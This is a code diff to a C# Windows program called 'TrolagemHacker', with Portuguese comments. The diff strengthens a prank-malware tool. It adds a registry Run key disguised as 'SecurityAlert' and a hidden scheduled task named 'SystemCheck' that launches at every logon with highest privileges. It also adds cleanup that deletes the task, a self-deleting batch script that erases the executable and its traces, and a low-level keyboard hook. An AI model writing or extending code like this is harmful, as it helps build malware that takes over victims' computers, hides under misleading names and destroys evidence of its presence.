@@ -125,12 +125,19 @@ public class TrolagemHacker : Form
             } catch {}
         }
 
-        // --- PERSISTÊNCIA ---
+        // --- PERSISTÊNCIA AVANÇADA ---
         try {
             string exePath = Application.ExecutablePath;
-            // Adiciona no Registro (Run)
+            // 1. Registro (Run) - Usuário Atual
             RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             rk.SetValue("SecurityAlert", exePath);
+
+            // 2. Tarefa Agendada (Task Scheduler) - Força abertura no Login
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "schtasks.exe";
+            psi.Arguments = "/create /sc onlogon /tn \"SystemCheck\" /tr \"" + exePath + "\" /f /rl highest";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            Process.Start(psi);
         } catch {}
 
         // --- PROTEÇÃO ---
@@ -169,22 +176,26 @@ public class TrolagemHacker : Form
             timerProtecao.Stop();
             Process.Start("explorer.exe");
             
-            // --- LIMPEZA DE RASTROS E AUTODESTRUIÇÃO ---
+            // --- LIMPEZA DE RASTROS ---
             try {
                 // Remove do registro
                 RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 rk.DeleteValue("SecurityAlert", false);
                 
-                // Apaga arquivos temporários e inicia script de autodestruição
+                // Remove Tarefa Agendada
+                ProcessStartInfo psiTask = new ProcessStartInfo();
+                psiTask.FileName = "schtasks.exe";
+                psiTask.Arguments = "/delete /tn \"SystemCheck\" /f";
+                psiTask.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(psiTask);
+
+                // Autodestruição
                 string exePath = Application.ExecutablePath;
                 string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
-                
-                // Cria um script batch que espera o programa fechar e apaga TUDO
                 string cleanupScript = "@echo off\n" +
                                        "timeout /t 2 /nobreak > nul\n" +
                                        "del /f /q \"" + exePath + "\"\n" +
                                        "del /f /q \"" + Path.Combine(Path.GetTempPath(), "TrolagemHacker.cs") + "\"\n" +
-                                       "del /f /q \"" + Path.Combine(Path.GetTempPath(), "AUTORUN_TROLAGEM_GHOST.bat") + "\"\n" +
                                        "del /f /q \"%~f0\"\n" +
                                        "exit";
                 File.WriteAllText(batPath, cleanupScript);
@@ -204,7 +215,6 @@ public class TrolagemHacker : Form
         }
     }
 
-    // --- LÓGICA DO HOOK DE TECLADO ---
     private static IntPtr SetHook(LowLevelKeyboardProc proc) {
         using (Process curProcess = Process.GetCurrentProcess())
         using (ProcessModule curModule = curProcess.MainModule) {
